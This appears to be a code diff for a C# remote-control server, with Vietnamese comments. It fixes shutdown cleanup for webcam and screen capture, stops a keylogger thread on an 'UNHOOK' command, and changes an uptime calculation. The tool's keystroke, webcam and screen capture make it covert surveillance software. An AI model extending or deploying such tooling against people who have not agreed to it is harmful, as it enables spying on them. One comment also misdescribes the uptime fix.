@@ -131,9 +131,20 @@ namespace ServerApp
 
         // ==================== EVENT HANDLERS ====================
 
-        // Đảm bảo ngắt toàn bộ tiến trình khi đóng Form
+        // Đảm bảo dọn dẹp tài nguyên và ngắt toàn bộ tiến trình khi đóng Form
         private void server_FormClosing(object sender, FormClosingEventArgs e)
         {
+            // Dọn dẹp tài nguyên trước khi kill
+            try
+            {
+                if (statsTimer != null) { statsTimer.Stop(); statsTimer.Dispose(); }
+                if (cpuCounter != null) cpuCounter.Dispose();
+                if (ramCounter != null) ramCounter.Dispose();
+                if (webcamCapture != null) webcamCapture.TurnOff();
+                if (screenCapture != null) screenCapture.StopStream();
+            }
+            catch { }
+            
             System.Diagnostics.Process.GetCurrentProcess().Kill();
         }
 
@@ -425,7 +436,12 @@ namespace ServerApp
                     case "UNHOOK": // Dừng ghi phím
                         if (tklog != null && tklog.IsAlive)
                         {
-                            try { tklog.Abort(); } catch { }
+                            try 
+                            { 
+                                KeyLogger.InterceptKeys.stopKLog();  // Gọi stopKLog thay vì Abort
+                                tklog.Join(500);  // Đợi thread kết thúc tối đa 500ms
+                            } 
+                            catch { }
                             tklog = null;
                         }
                         break;
@@ -860,8 +876,11 @@ namespace ServerApp
                 }
                 catch { }
 
-                // Lấy Uptime (Thời gian máy đã chạy) - MỚI
-                TimeSpan uptime = TimeSpan.FromMilliseconds(Environment.TickCount);
+                // Lấy Uptime (Thời gian máy đã chạy) - FIX OVERFLOW
+                // Environment.TickCount là Int32, overflow sau ~24.9 ngày
+                // Sử dụng Math.Abs để xử lý giá trị âm khi overflow
+                long uptimeMs = (long)(uint)Environment.TickCount;  // Cast sang uint rồi long để tránh overflow
+                TimeSpan uptime = TimeSpan.FromMilliseconds(uptimeMs);
                 string uptimeStr = string.Format("{0}d {1}h {2}m", uptime.Days, uptime.Hours, uptime.Minutes);
 
                 // Format chuỗi gửi đi: 
